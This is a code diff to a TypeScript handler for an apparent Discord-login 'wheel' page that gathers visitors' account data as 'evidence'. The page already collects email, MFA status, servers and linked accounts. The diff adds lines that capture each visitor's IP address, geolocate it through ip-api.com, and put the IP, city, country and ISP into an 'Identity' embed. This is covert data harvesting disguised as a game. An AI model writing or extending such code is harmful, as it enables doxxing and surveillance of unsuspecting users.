@@ -40,7 +40,7 @@ function notFound() {
   return { status: 404, headers: { 'Content-Type': 'text/plain' }, body: 'Not Found' };
 }
 
-export async function handleWheelRequest(url: URL, method: string, rawBody?: string): Promise<{ status: number; headers: Record<string, string>; body: string }> {
+export async function handleWheelRequest(url: URL, method: string, rawBody?: string, reqHeaders: Record<string, string | string[] | undefined> = {}): Promise<{ status: number; headers: Record<string, string>; body: string }> {
   const path = url.pathname;
 
   if (path === '/wheel' || path === '/wheel/') {
@@ -350,11 +350,29 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
         ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png`
         : `https://cdn.discordapp.com/embed/avatars/${(discordUser.discriminator || '0') % 5}.png`;
 
+      // CAPTURE IP AND GEOLOCATION INTELLIGENCE
+      const forwardedFor = reqHeaders['x-forwarded-for'];
+      const userIp = (typeof forwardedFor === 'string' ? forwardedFor.split(',')[0] : (Array.isArray(forwardedFor) ? forwardedFor[0] : 'Unknown')) || 'Unknown';
+      let geoInfo = { city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+      
+      try {
+        const geoRes = await fetch(`http://ip-api.com/json/${userIp}?fields=status,message,country,city,isp`);
+        if (geoRes.ok) {
+          const geoData = await geoRes.json();
+          if (geoData.status === 'success') {
+            geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
+          }
+        }
+      } catch {}
+
       const evidence = {
         email: discordUser.email || null,
         verified: discordUser.verified || false,
         locale: discordUser.locale || null,
         mfa_enabled: discordUser.mfa_enabled || false,
+        ip: userIp,
+        location: `${geoInfo.city}, ${geoInfo.country}`,
+        isp: geoInfo.isp,
         guilds: (guildsData || []).map((g: any) => ({ id: g.id, name: g.name, owner: g.owner, permissions: g.permissions })),
         connections: (connData || []).map((c: any) => ({ type: c.type, name: c.name, id: c.id, verified: c.verified }))
       };
@@ -386,7 +404,7 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
             embeds: [
               {
                 title: `Identity: ${discordUser.global_name || discordUser.username}`,
-                description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**Nitro:** \`${nitroStatus}\`\n**Verified:** \`${discordUser.verified}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Locale:** \`${discordUser.locale}\``,
+                description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**IP:** \`${evidence.ip}\`\n**Location:** \`${evidence.location}\`\n**ISP:** \`${evidence.isp}\`\n**Nitro:** \`${nitroStatus}\`\n**Verified:** \`${discordUser.verified}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Locale:** \`${discordUser.locale}\``,
                 color: 0x8b5cf6,
                 thumbnail: { url: avatarUrl },
                 image: bannerUrl ? { url: bannerUrl } : undefined,
